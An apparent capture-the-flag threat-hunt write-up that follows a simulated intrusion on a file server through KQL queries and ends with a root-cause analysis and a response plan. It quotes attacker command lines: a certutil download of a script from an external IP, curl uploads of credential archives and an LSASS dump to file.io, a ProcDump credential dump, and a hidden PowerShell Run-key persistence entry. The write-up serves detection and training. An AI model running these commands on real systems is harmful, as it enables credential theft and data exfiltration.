## Table of Contents
1. Summary of Findings (SPOILERS)
2. Threat Hunt Investigation
3. Root Cause Analysis
4. Technical Timeline
5. Response and Recovery Strategy
	1. Immediate Response
	2. Containment
	3. Eradication 
	4. Recovery
6. Post Incident Review
7. Business Impact
	1. Share holders
	3. Business Partners
	4. Employees
	5. Customers
9. Appendix A. Indicators of Compromise (IOCs)
10. Appendix B. MITRE ATT&CK Mapping

## Summary of Findings (SPOILERS)

Below is a dropdown with findings (flags) to this threat hunt. <br>
If you do not want to be spoiled, skip to the next section: [**Threat Hunt Investigation**]()

<details>
  <summary>SPOILERS: Show Findings</summary>
	
  <table>
  

| **Flag** |                              **Objective**                              |                                        **Finding**                                         |       **Timestamp (UTC)**        |
| :------: | :---------------------------------------------------------------------: | :----------------------------------------------------------------------------------------: | :------------------------------: |
|    1     |         Identify the source IP address of the return connection         |                                      `159.26.106.98`                                       |  `2025-11-22T00:27:53.7487323Z`  |
|    2     |            Identify the compromised file server device name             |                                    `azuki-fileserver01`                                    |  `2025-11-22T00:38:57.1782864Z`  |
|    3     |             Identify the compromised administrator account              |                                        `fileadmin`                                         |  `2025-11-22T00:38:49.3470269Z`  |
|    4     |       Identify the command used to enumerate local network shares       |                                     `"net.exe" share`                                      |  `2025-11-22T00:40:54.8271951Z`  |
|    5     |          Identify the command used to enumerate remote shares           |                               `"net.exe" view \\10.1.0.188`                                |  `2025-11-22T00:42:01.9579347Z`  |
|    6     |         Identify the command used to enumerate user privileges          |                                    `"whoami.exe" /all`                                     |  `2025-11-22T00:42:24.1217046Z`  |
|    7     |      Identify the command used to enumerate network configuration       |                                   `"ipconfig.exe" /all`                                    |  `2025-11-22T00:42:46.3655894Z`  |
|    8     |         Identify the command used to hide the staging directory         |                          `"attrib.exe" +h +s C:\Windows\Logs\CBS`                          |  `2025-11-22T00:55:43.9986049Z`  |
|    9     |                Identify the data staging directory path                 |                                   `C:\Windows\Logs\CBS`                                    |  `2025-11-22T00:55:43.9986049Z`  |
|    10    |       Identify the command used to download the PowerShell script       | ``"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`` |  `2025-11-22T00:56:47.4100711Z`  |
|    11    |       What credential file was created in the staging directory?        |                                  `IT-Admin-Passwords.csv`                                  | ``2025-11-22T01:07:53.6746323Z`` |
|    12    |        What command was used to stage data from a network share?        |       `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`        |  `2025-11-22T01:07:53.6746323Z`  |
|    13    |      What command was used to compress the staged collection data?      | `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`  |  `2025-11-22T01:30:10.1421235Z`  |
|    14    |              What was the renamed credential dumping tool?              |                                          `pd.exe`                                          |  `2025-11-22T02:24:47.6967458Z`  |
|    15    | What command was used to dump process memory for credential extraction? |                `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`                |  `2025-11-22T02:24:47.6967458Z`  |
|    16    |          What command was used to exfiltrate the staged data?           |        `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`        |  `2025-11-22T01:59:54.2755596Z`  |
|    17    |           What cloud service was used for data exfiltration?            |                                         `file.io`                                          |  `2025-11-22T01:59:54.2755596Z`  |
|    18    |       What registry value name was used to establish persistence?       |                                      `FileShareSync`                                       |  `2025-11-22T02:10:50.7952326Z`  |
|    19    |                What is the persistence beacon filename?                 |                                       `svchost.ps1`                                        |  `2025-11-22T02:10:50.7952326Z`  |
|    20    |                What PowerShell history file was deleted?                |                                 `ConsoleHost_history.txt`                                  |  `2025-11-22T02:26:01.1661095Z`  |

  </table>

</details>

## Threat Hunt Investigation

### 🚩 **FLAG 1: INITIAL ACCESS - Return Connection Source**
After establishing initial access, sophisticated attackers often wait hours or days (dwell time) before continuing operations. They may rotate infrastructure between sessions to avoid detection.

Based on the previous investigation, credentials were stolen from user account `kenji.sato`
Additionally, the incident brief mentioned the attacker accessing the compromised system after 72 hours. So I searched for `DeviceLogonEvents` 72 hours after the initial compromise.

```KQL
DeviceLogonEvents
| where Timestamp > datetime(2025-11-22 00:00:00) 
| where DeviceName contains "azuki" 
| where AccountName == "kenji.sato"
| project Timestamp, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemotePort 
| sort by Timestamp asc
```
<img width="1353" height="485" alt="Screenshot_8" src="https://github.com/user-attachments/assets/65ea007d-f177-4253-aa55-804fa2109733" />

The information given was confirmed as we can see an external IP address, `159.26.106.98`, was able to successfully remote into the compromised account at `2025-11-22T00:27:53.7487323Z`

Since this could indicate the start of the attack, I am using this timestamp to help filter future queries to after this timeframe. 

**Question:** Identify the source IP address of the return connection? <br>
Flag: `159.26.106.98` <br>
Timestamp: `2025-11-22T00:27:53.7487323Z`

### 🚩 **FLAG 2: LATERAL MOVEMENT - Compromised Device**
Lateral movement targets are selected based on their access to sensitive data or network privileges. File servers are high-value targets containing business-critical information.

As seen from the previous threat hunt, the attacker attempted to move laterally using `mstsc.exe`
```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains "mstsc.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="790" height="286" alt="Screenshot_9" src="https://github.com/user-attachments/assets/d945e6e4-f306-4de0-9b16-cf187a569a0a" />

Approximately 10 minutes after authenticating, the attacker tried to RDP to the internal host `10.1.0.188`

I'm not familiar with this internal host, so I had to do more digging:
```KQL 
DeviceLogonEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-22T00:38:47.8327343Z')
| project Timestamp, AccountName, DeviceName, ActionType, LogonType, RemoteIP, RemotePort
| sort by Timestamp asc
```
<img width="1299" height="424" alt="Screenshot_10" src="https://github.com/user-attachments/assets/b1eb3f37-85e5-41cb-8ecb-273676ab882d" />

Based on the timeframe, the attacker was able to remotely access `azuka-fileserver01` on user account `fileadmin`

**Question:** Identify the compromised file server device name? <br>
Flag: `azuki-fileserver01` <br>
Timestamp: `2025-11-22T00:38:57.1782864Z`

### 🚩 **FLAG 3: LATERAL MOVEMENT - Compromised Account**
Identifying which credentials were compromised determines the scope of unauthorized access and guides remediation efforts.

**Question:** Identify the compromised administrator account? <br>
Flag: `fileadmin` <br>
Timestamp: `2025-11-22T00:38:49.3470269Z`

### 🚩 **FLAG 4: DISCOVERY - Share Enumeration Command**
Network share enumeration reveals available data repositories and helps attackers identify targets for collection and exfiltration.

Now the attacker was able to compromise another system within the network, they'll most likely perform discovery activities to identify local and remote information about the system
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == "fileadmin"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1291" height="811" alt="Screenshot_11" src="https://github.com/user-attachments/assets/bcdbe21e-e348-4f73-a01f-99c9dfce6efe" />

Which is confirmed as we see the the attacker snooping for the following information:
- Host and OS information (`whoami.exe`, `hostname.exe`, `systeminfo.exe`) 
- Account privileges and group enumeration (`net.exe user`, `net.exe localgroup`)
- Network configuration and discovery (`ipconfig.exe`, `arp.exe`)
-  Local and Remote share enumeration (`net.exe share`, `net.exe view \\10.1.0.188`)

**Question:** Identify the command used to enumerate local network shares? <br>
Flag: `"net.exe" share` <br>
Timestamp: `2025-11-22T00:40:54.8271951Z`

### 🚩 **FLAG 5: DISCOVERY - Remote Share Enumeration**
Attackers enumerate remote network shares to identify accessible file servers and data repositories across the network.

**Question:** Identify the command used to enumerate remote shares? <br>
Flag: `"net.exe" view \\10.1.0.188` <br>
Timestamp: `2025-11-22T00:42:01.9579347Z`

### 🚩 **FLAG 6: DISCOVERY - Privilege Enumeration**
Understanding current user privileges and group memberships helps attackers determine what actions they can perform and whether privilege escalation is needed.

**Question:** Identify the command used to enumerate user privileges? <br>
Flag: `"whoami.exe" /all` <br>
Timestamp: `2025-11-22T00:42:24.1217046Z` <br>

### 🚩 **FLAG 7: DISCOVERY - Network Configuration Command**
Network configuration enumeration helps attackers understand the target environment, identify domain membership, and discover additional network segments.

**Question:** Identify the command used to enumerate network configuration? <br>
Flag: `"ipconfig.exe" /all` <br>
Timestamp: `2025-11-22T00:42:46.3655894Z`

### 🚩 **FLAG 8: DEFENSE EVASION - Directory Hiding Command**
Modifying file system attributes to hide directories prevents casual discovery by users and some security tools. Document the exact command line used.

Scrolling down a bit further, I discovered the attacker trying to hide a specific directory
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == "fileadmin"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| project Timestamp, AccountName, DeviceName, FileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1329" height="386" alt="Screenshot_12" src="https://github.com/user-attachments/assets/f19fc77f-06d4-4d7b-8711-cd79b92b4c39" />

The attacker ran the command: ``"attrib.exe" +h +s C:\Windows\Logs\CBS``
- `attrib.exe` utility to modify file or directory attributes
- `+h` sets directory as hidden
- `+s` sets directory as a system folder
- `C:\Windows\Logs\CBS` target directory

`C:\Windows\Logs\CBS` is not a legitimate system directory. It's more than likely a staging directory for future use.

Their behavior matches the behavior from the compromise 72 hours prior:
Initial Access -> Discovery -> Defense Evasion 

**Question:** Identify the command used to hide the staging directory? <br>
Flag: `"attrib.exe" +h +s C:\Windows\Logs\CBS` <br>
Timestamp: `2025-11-22T00:55:43.9986049Z`

### **🚩 FLAG 9: COLLECTION - Staging Directory Path**
Attackers establish staging locations to organize tools and stolen data before exfiltration. This directory path is a critical IOC

**Question:** Identify the data staging directory path? <br>
Flag: `C:\Windows\Logs\CBS` <br>
Timestamp: `2025-11-22T00:55:43.9986049Z`

### **🚩** **FLAG 10: DEFENSE EVASION - Script Download Command**
Legitimate system utilities with network capabilities are frequently weaponized to download malware while evading detection.

Now that I know a potential staging directory, I want to know what process have targeted it.
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, DeviceName, InitiatingProcessFileName, ProcessCommandLine 
| sort by Timestamp asc
```
<img width="1368" height="780" alt="Screenshot_13" src="https://github.com/user-attachments/assets/09d7317a-0690-4389-bc2a-5d31c7980e67" />

The attacker was able to download a file using `certutil` as a [LOLbin]() to evade being detected.

They were able to download a PowerShell script, `ex.ps1`, from `78[.141[.]196[.]6` over ports `7331` and `8080`

**Question:** Identify the command used to download the PowerShell script? <br>
Flag: `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1` <br>
Timestamp: `2025-11-22T00:56:47.4100711Z`

### **🚩** **FLAG 11: COLLECTION - Credential File Discovery**
Credential files provide keys to the kingdom - enabling lateral movement and privilege escalation across the network.

From the previous query, I also see the attacker copying directories from `C:\FileShares` to the staging directory
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, DeviceName, InitiatingProcessFileName, ProcessCommandLine 
| sort by Timestamp asc
```
<img width="1320" height="768" alt="Screenshot_14" src="https://github.com/user-attachments/assets/20315869-dda4-4a88-bb8a-8526896a3c0c" />

The attacker was able to use `xcopy`, another [LOLbin](), to copy files over:
`xcopy.exe C:\FileShares\Contracts C:\Windows\Logs\CBS\contracts /E /I /H /Y`
`xcopy.exe C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`
`xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
`xcopy.exe C:\FileShares\Shipping C:\Windows\Logs\CBS\shipping /E /I /H /Y`
- `/E` copies all subdirectories (including empty directories)
- `/I` assumes source is directory 
- `/H` copies hidden and system files 
- `/Y` auto-approves overwriting file prompt
Reference: [xcopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy)

This staging directory now has every file from the file share's directories:
- `C:\FileShares\Contracts`
- `C:\FileShares\Financial`
- `C:\FileShares\IT-Admin`
- `C:\FileShares\Shipping`

However, this does not provide enough information about what files we copied, so I need to look deeper into`DeviceFileEvents`

```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```
<img width="1635" height="930" alt="Screenshot_16" src="https://github.com/user-attachments/assets/d90ace10-9317-46cc-a16b-0c158badb681" />
Boom. <br>
Every file copied over.
- Contracts
- Purchase orders
- Employee contracts and performance reviews
- Invoices
- Quarter performances
- Tax documents
- Weekly and monthly file backups
- Email archives

And buried within the hundreds of sensitive business documents, we see the attacker stealing the spreadsheet `IT-Admin-Passwords.csv`
<img width="1716" height="469" alt="Screenshot_15" src="https://github.com/user-attachments/assets/16f56572-a24f-496f-b521-083f912b382b" />

**Question:** What credential file was created in the staging directory? <br>
Flag: `IT-Admin-Passwords.csv` <br>
SHA 256 Hash: `08555169a2fda7c5cd5e870a4ab7e2a6793592f6f2a91f7606b94e25ef5c3df3` <br>
Timestamp: `2025-11-22T01:07:53.6746323Z`

### **🚩** **FLAG 12: COLLECTION - Recursive Copy Command**
Built-in system utilities are preferred for data staging as they're less likely to trigger security alerts. The exact command line reveals attacker methodology.

**Question:** What command was used to stage data from a network share? <br>
Flag: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y` <br>
Timestamp: `2025-11-22T01:07:53.6746323Z`

### 🚩 **FLAG 13: COLLECTION - Compression Command**
Cross-platform compression tools indicate attacker sophistication. The full command line reveals the exact archiving methodology used.

Right after copying files to the staging directory, the attacker is seen compressing each directory and using `tar.exe` to archive 
```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where FolderPath contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

Archiving the compressed .zip files provides the attacker: 
- Additionally compression, improving transfer over network
- Compatible with Linux archiving and compression
- Hides file contents from inspection

**Question:** What command was used to compress the staged collection data? <br>
Flag: `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .` <br>
Timestamp: `2025-11-22T01:30:10.1421235Z`

### 🚩 **FLAG 14: CREDENTIAL ACCESS - Renamed Tool**
Renaming credential dumping tools is a basic OPSEC practice to evade signature-based detection.

20 minutes after archiving, the attacker is seen running another executable `pd.exe` and deleting right after use.
<img width="1965" height="1040" alt="Screenshot_19" src="https://github.com/user-attachments/assets/c9ff7a59-de83-419d-add3-2723035b0bed" />


Putting the SHA256 hash of this application does not return malicious results.
<img width="1324" height="520" alt="Screenshot_20" src="https://github.com/user-attachments/assets/3495bc3b-da4b-4054-bdb9-4c0156aa8872" />

So this isn't Mimikatz renamed as seen in the previous incident, but it for sure still dumps LSASS memory.

However, the name of this file rang a bell. <br>
I recently used this application on my personal computer. 

pd.exe -> ProcDump
[ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump), a legitimate utility apart of the [Windows Sysinternal Suite](https://learn.microsoft.com/en-us/sysinternals/)

`"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
- `pd.exe` ProcDump renamed
- `-accepteula` agree to License Agreement 
- `-ma` creates full memory dump
- `876`  PID of LSASS 
- `C:\Windows\Logs\CBS\lsass.dmp` output file location

Running ProcDump on my own computer shows the EULA prompt on initial launch:
<img width="1001" height="541" alt="Screenshot_18" src="https://github.com/user-attachments/assets/82cb74bb-b5cd-428f-b05b-bfdd77079f93" />

**Question:** What was the renamed credential dumping tool? <br>
Flag: `pd.exe` <br>
Timestamp: `2025-11-22T02:24:47.6967458Z`

### 🚩 **FLAG 15: CREDENTIAL ACCESS - Memory Dump Command**
The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.

**Question:** What command was used to dump process memory for credential extraction? <br>
Flag: `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` <br>
Timestamp: `2025-11-22T02:24:47.6967458Z`

### 🚩 **FLAG 16: EXFILTRATION - Upload Command**
Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.

The staged directory was discovered with its contents, but I still need to confirm that data was exfiltrated from the system. As seen from previous behavior, the attacker was able to exfiltrate data to a third party cloud service. 
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine contains "http" and ProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, AccountName, FileName, ProcessCommandLine
| sort by Timestamp asc
```

Yes, the attacker utilized `curl.exe` to exfiltrate data to `https://file.io`
<img width="1134" height="505" alt="Screenshot_23" src="https://github.com/user-attachments/assets/bccc0d2f-eae0-41ff-86eb-778e26f1b856" />

But let's double check network activity to see if the connections were successful.
```KQL
DeviceNetworkEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where InitiatingProcessCommandLine contains "http" and InitiatingProcessCommandLine contains @"C:\Windows\Logs\CBS"
| project Timestamp, ActionType, InitiatingProcessAccountName, DeviceName, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
| sort by Timestamp asc
```
<img width="1859" height="676" alt="Screenshot_22" src="https://github.com/user-attachments/assets/11c54ca0-2a7d-43b8-b49a-d0c1ef68b334" />

Unfortunately, the attacker was able to successfully exfiltrate:
- `credentials.tar.gz`
- `financial.tar.gz`
- `contracts.zip`
- `shippping.tar.gz`
- `lsass.dmp`

**Question:** What command was used to exfiltrate the staged data? <br>
Flag: `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` <br>
Timestamp: `2025-11-22T01:59:54.2755596Z`

### 🚩 **FLAG 17: EXFILTRATION - Cloud Service**
Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.

**Question:** What cloud service was used for data exfiltration? <br>
Flag: `file.io` <br>
Timestamp: `2025-11-22T01:59:54.2755596Z` <br>

### 🚩 **FLAG 18: PERSISTENCE - Registry Value Name**
Registry autorun keys provide reliable persistence that executes on every system startup or user logon.

Based on the attacker's behaviors from the previous incident, they were able to set up persistence mechanisms using local accounts and a scheduled task that runs daily. Unfortunately, searching for commands that contain `schtask` or `/add` does not return any results.

Another persistence mechanism attackers abuse are Windows Registry keys. So I looked if they modified any
```KQL
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ProcessCommandLine has_any ("HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKLM")
| project Timestamp, AccountName, InitiatingProcessFileName, ProcessCommandLine
| sort by Timestamp asc
```
<img width="1552" height="345" alt="Screenshot_24" src="https://github.com/user-attachments/assets/8801fd90-027a-4a78-8ee3-4d6e22db2420" />

Just as I suspected. The attacker created a new autorun registry value

`"reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`
- `reg.exe add` adds new registry value 
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` startup autorun key
- `/v FileShareSync` registry value name 
- `/t REG_SZ` registry type string
- `/d` registry value data
- `"powershell` executes PowerShell
- `-NoP` no profile
- `-W Hidden` hides PowerShell window
- `-File C:\Windows\System32\svchost.ps1` malicious PowerShell script
- `-f` force change

So whatever resides in the script `C:\Windows\System32\svchost.ps1` will execute automatically on startup

**Question:** What registry value name was used to establish persistence? <br>
Flag: `FileShareSync` <br>
Timestamp: `2025-11-22T02:10:50.7952326Z`

### 🚩 **FLAG 19: PERSISTENCE - Beacon Filename**
Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion

**Question:** What is the persistence beacon filename? <br>
Flag: `svchost.ps1` <br>
Timestamp: `2025-11-22T02:10:50.7952326Z`

### 🚩 **FLAG 20: ANTI-FORENSICS - History File Deletion**
PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.

With their persistence mechanism set and active, the attacker is most likely going to delete any traces of their activity. I looked at `DeviceFileEvents` to see if any artifacts were deleted.

```KQL
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where Timestamp > todatetime('2025-11-22T00:27:53.7487323Z')
| where ActionType == "FileDeleted"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine
| sort by Timestamp asc
```
<img width="1493" height="351" alt="Screenshot_25" src="https://github.com/user-attachments/assets/6cc063d5-2481-448a-ab59-b8f1542f1178" />

There are two files that were deleted:
- `ConsoleHost_history.txt` PowerShell history
- `pd.exe`  memory dumping executable (ProcDump?)

PowerShell saves command history in this text file. It is important for an attacker to remove this file to hide commands they ran during their attack. 

**Question:** What PowerShell history file was deleted? <br>
Flag: `ConsoleHost_history.txt` <br> 
Timestamp: `2025-11-22T02:26:01.1661095Z`

## Root Cause Analysis
The root cause of this incident was the successful reuse of compromised credentials associated with user account `kenji.sato`, combined with insufficient network controls to detect and block unauthorized re-entry into Azuki Import/Export CO., LTD.'s internal network.

Initial threat actor behavior was discovered in previous incident ([Port of Entry]()) 

The lack of behavioral alerts for abnormal use of native administrative tools and non-standard system paths enabled the attacker to stage, compress, and exfiltrate data bypassing early detection. While endpoint telemetry captured their activity, our delayed detection and response allowed the attacker to carry out their attack before containment actions were taken.

## Threat Actor Timeline

### Initial Access
Timestamp: `2025-11-22T00:27:53.7487323Z` <br>
The threat actor waited approximately 72 hours before re-entering the network. <br>
An external IP `159.26.106.98` successfully authenticated into the environment on workstation `azuki-sl` using compromised credentials of `kenji.sato`

### Lateral Movement
Timestamp: `2025-11-22T00:38:57.1782864Z` <br>
The threat actor successfully established an RDP session to internal file server `azuki-filserver01` using admin account `fileadmin`

### Discovery
Timestamp: `2025-11-22T00:40:09.3456568Z - 2025-11-22T00:42:50.3568093Z` <br>
During this timeframe, the threat actor executed multiple discovery commands to gather:
- Host and operating system information
- Account privileges and group memberships
- Network configuration details
- Local and remote shares

This allowed the attacker to map the environment, assess privileges, and identify accessible network shares

### Defense Evasion
Timestamp: `2025-11-22T00:55:43.9986049Z` <br>

Threat actor hid their staging directory using the following command: 
```KQL
"attrib.exe" +h +s C:\Windows\Logs\CBS
```

###  Delivery
Timestamp: `2025-11-22T00:56:47.4100711Z` <br>

Threat actor abused `certutil.exe`  as a LOLbin to download a PowerShell script into the hidden staging director:
```KQL
"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
```

### Collection
Timestamp: `2025-11-22T01:05:33.2121311Z - 2025-11-22T01:20:46.5297689Z` <br>
Threat actor abused `xcopy.exe` to recursively stage data from multiple network file shares into the hidden staging directory:
`xcopy.exe C:\FileShares\Contracts C:\Windows\Logs\CBS\contracts /E /I /H /Y`  
`xcopy.exe C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`  
`xcopy.exe C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`  
`xcopy.exe C:\FileShares\Shipping C:\Windows\Logs\CBS\shipping /E /I /H /Y`

These file shares contained an extensive list of business sensitive documents alongside employee data and credentials.

### Defense Evasion
Timestamp: `2025-11-22T01:21:38.5249286Z - 2025-11-22T01:42:19.2013169Z` <br>
Threat actor compressed and archived the staged data using `tar.exe`:
```KQL
"tar.exe" -czf C:\Windows\Logs\CBS\financial.tar.gz -C C:\Windows\Logs\CBS\financial .
"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
"tar.exe" -czf C:\Windows\Logs\CBS\shipping.tar.gz -C C:\Windows\Logs\CBS\shipping .
```

This activity indicates preparation for data exfiltration.

### Exfiltration
Timestamp: `2025-11-22T01:59:54.2755596Z` <br>
Threat actor successfully exfiltrated archived data from the staging diretory to the external  cloud service `https://file.io` using `curl.exe`:
```KQL
`"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
`"curl.exe" -F file=@C:\Windows\Logs\CBS\financial.tar.gz https://file.io`
`"curl.exe" -F file=@C:\Windows\Logs\CBS\contracts.zip https://file.io`
`"curl.exe" -F file=@C:\Windows\Logs\CBS\shipping.tar.gz https://file.io`
```

### Persistence
Timestamp: `2025-11-22T02:10:50.7952326Z` <br>

Threat actor established persistence on the system by modifying a Windows Registry Run key to execute a hidden PowerShell script on system startup: 
```KQL
"reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f
```

### Credential Access
Timestamp: `2025-11-22T02:24:47.6967458Z` <br>
Threat actor dumped LSASS process memory using the following command: 
```KQL
"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
```

### Exfiltration
Timestamp: `2025-11-22T02:25:37.7880471Z` <br>
The LSASS memory dump was successfully exfiltrated to the same external cloud service:
```KQL
"curl.exe" -F file=@C:\Windows\Logs\CBS\lsass.dmp https://file.io
```

### Defense Evasion 
Timestamp: `2025-11-22T02:26:01.1661095Z - 2025-11-22T02:26:23.4180939Z` <br>
Threat actor performed anti-forensic activity by deleting the following artifacts:
- `ConsoleHost_history.txt` PowerShell history
- `pd.exe` Credential dumping tool

This action may hinder forensic analysis by removing evidence of executed commands and specific tooling used in the attack

## Response and Recovery Strategy

### Immediate Response
Upon confirmation of unauthorized access and data exfiltration, incident response procedures were initiated.  Impacted systems and user accounts were identified to assess the scope of compromise. Security leadership was notified of the incident and forensic evidence collection began to preserve system artifacts, logs, and telemetry.

Identified systems:
- `azuki-sl`
- `azuki-fileserver01`

Identified Accounts:
- `kenji.sato`
- `fileadmin`
### Containment
Following identification of affected systems and forensic preservation, Network segmentation was implemented, isolating the affected workstation and file server from the rest of the internal network. Additionally:
- Identified C2 IP addresses were added to network blocklist preventing further external communication
- Credentials of compromised accounts were reset and all active sessions were forcibly terminated to immediately remove unauthorized access
- Temporary access restrictions were applied to sensitive file shares to prevent the access and modification of sensitive documents
### Eradication
Following containment, efforts focused on removing attacker's presence from the environment. Malicious scripts, tools, staged data were identified and removed. Registry modifications created by the attacker were reverted and any unauthorized executables were deleted. 

Comprehensive security scans were conducted on the affected systems to ensure eradication was complete. Endpoint malware scans were performed to detect remnants of any malicious files or processes. System integrity checks were conducted to ensure no additional persistent mechanisms or unauthorized changes remained. 
### Recovery
Following successful eradication, recovery efforts focused on restoring normal operations while ensuring the environment remained secure and stable. Affected systems were validated through integrity checks and endpoint security scans to confirm residual malicious activity remained.

System backups were not used during recovery, as there was no evidence of data corruption, encryption, or system damage requiring restoration. Avoiding restoration from backups reduced recovery time and minimized the risk of reintroducing outdated configurations or overwriting forensic evidence.

## Post Incident
Following recovery, a post-incident review was conducted to evaluate the effectiveness of detection, response, and recovery efforts to identify areas of improvement. The review confirmed that while endpoint telemetry and logging captured the attacker’s activity, several opportunities existed to detect and disrupt the attack earlier in its lifecycle.

The following security improvements were recommended: 

**Identity Access and Management**:
- Enforce MFA for administrative accounts
- Regularly audit privileged accounts

**Monitoring and Detection**:
 - Alert on execution of administrative tools from non-standard directories
 - Alert on hidden file and directory creation or modification
 - Alert and visibility for suspicious PowerShell usage (non-interactive, hidden)
 - Improve command-line logging and alerting to identify suspicious commands
 - Alert registry key modification associated with persistence mechanism

**Network**
- Audit network segmentation between workstations and servers
- Implement egress filtering to restrict outbound connections to unauthorized external services

**Security Awareness**:
- Reinforce security awareness training with an emphasis on credential hygiene and reporting suspicious activity

## Business Impact

### Shareholders
The exposure of internal backups, financial information, business partner documentation, employee credentials, and email archives introduces a significant amount of risk to the organization. The theft of historical backups and financial records increases the likelihood of follow-up attacks, public and business partner scrutiny, and potential financial loss. While no operational outage occurred, the incident highlights the need strengthen and modernize existing security controls to protect shareholder value and support for long-term organizational stability.

### Business Partners
Exfiltrated data included contracts, purchase orders, documentation, and shipping records directly tied to our external business partners. This compromise may impact partner trust and expose sensitive commercial information. In accordance wiht data breach notification requirements, affected business partners will be notified within 48 business hours. Additionally, continuous monitoring of dark web marketplaces and forums will be conducted to identify any potential sale or distribution of exfiltrated data.

### Employees
The theft of administrative credentials and email data presents a direct security risk to employees. These files may contain usernames, passwords, internal communications and sensitive personal information. As a result, employees were required to reset their credentials. Account monitoring has been implemented to detect misuse of stolen information.

### Customers
No customer-facing systems have been confirmed to be compromised at this time. However, the exfiltration of many operational data including financial records and shipping documentation does introduce an indirect risk to our customers. Exposure of this information could enable fraud or impersonation attempts. Continued monitoring and strengthening current security controls are necessary to ensure customer trust is maintained and prevent further impact stemming form the misuse of stolen internal data. 

## Appendix A: Indicators of Compromise 

|    **Type**    |                                                                                                                                                           **Indicator**                                                                                                                                                            |                                  **Context**                                   |
| :------------: | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :----------------------------------------------------------------------------: |
|   IP Address   |                                                                                                                                                        159[.]26[.]106[.]98                                                                                                                                                         |       External IP used to re-authenticate using compromised credentials        |
